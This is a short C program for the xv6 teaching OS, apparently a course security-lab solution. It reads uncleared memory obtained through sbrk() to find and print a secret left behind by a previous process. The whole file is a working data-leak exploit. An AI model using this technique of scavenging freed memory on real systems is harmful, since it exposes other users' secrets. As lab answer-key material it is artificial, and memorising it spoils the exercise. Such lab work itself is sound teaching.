#include "kernel/types.h"
#include "user/user.h"

// We search a larger area (128 pages) to ensure we catch the 
// physical memory used by the previous process.
#define SEARCH_SIZE (128 * 4096)

int
main(int argc, char *argv[])
{
  // 1. Allocate memory using sbrk().
  // Because the lab disables memset() in the kernel, this memory 
  // will contain "dirty" data from previous processes.
  char *data = sbrk(SEARCH_SIZE);
  
  // Basic error checking for memory allocation.
  if (data == (char*)-1) {
    printf("sbrk failed\n");
    exit(1);
  }

  // 2. Define our "anchor" string.
  // We look for this specific string to find where the secret is.
  char *marker = "This may help.";
  int marker_len = strlen(marker);

  // 3. Scan the allocated memory for the marker.
  // We stop (marker_len + 64) bytes early to prevent the loop from 
  // running off the end and causing a page fault crash (scause 0xd).
  for (int i = 0; i < SEARCH_SIZE - 64; i++) {
    
    // Check if the current location in 'data' matches our marker string.
    if (memcmp(&data[i], marker, marker_len) == 0) {
      
      // 4. Calculate the location of the secret.
      // In secret.c, the secret was copied to (data + 16).
      char *secret_candidate = &data[i + 16];

      // 5. Filter for valid data.
      // We check if the first character is a lowercase letter to avoid
      // printing "(null)" or junk characters from partial overwrites.
      if (secret_candidate[0] >= '!' && secret_candidate[0] <= '~') {
        
        // Print the stolen secret and a newline.
        printf("%s\n", secret_candidate);
        
        // Exit immediately once the secret is found.
        exit(0); 
      }
    }
  }

  // Exit gracefully if no secret was found in the allocated memory.
  exit(0);
}
